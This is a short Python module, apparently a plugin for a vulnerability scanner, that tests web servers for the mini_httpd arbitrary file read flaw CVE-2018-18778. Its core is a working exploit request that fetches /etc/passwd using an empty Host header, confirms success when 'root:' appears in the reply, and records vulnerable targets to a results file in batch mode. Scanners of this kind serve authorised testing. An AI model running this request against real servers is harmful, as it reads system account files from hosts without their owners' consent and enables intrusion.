#!/user/bin/env python3
# -*- coding: utf-8 -*-
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
import requests
class Cve_2018_18778:
    def __init__(self):
        self.header = None
        self.proxy = None
    def send_payload(self,url):
        if not self.batch:
            OutPrintInfo("Mini", "开始检测Mini-Httpd任意文件读取...")
        url2 = url + "/etc/passwd"
        header = {
            "Host":"",
            "User-Agent":self.header,
        }
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=header)
            if "root:" in req.text:
                OutPrintInfoSuc("Mini", f"存在Mini-Httpd任意文件读取 {url2}")
                if not self.batch:
                    OutPrintInfo("Mini", "[b bright_red]复现需将请求头的Host设置未空 ｜ Host: ")
                else:
                    with open("./result/mini_httpd_2018_18778.txt","a") as w:
                        w.write(f"{url2} 复现需将请求头的Host设置未空\n")
        except Exception:
            if not self.batch:
                OutPrintInfo("Mini", "不存在Mini-Httpd任意文件读取")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]

        if not self.batch:
            req = ReqSet(proxy=proxy)
            self.proxy = req["proxy"]
        else:
            self.proxy = {"http": proxy, "https": proxy}


        self.send_payload(url)


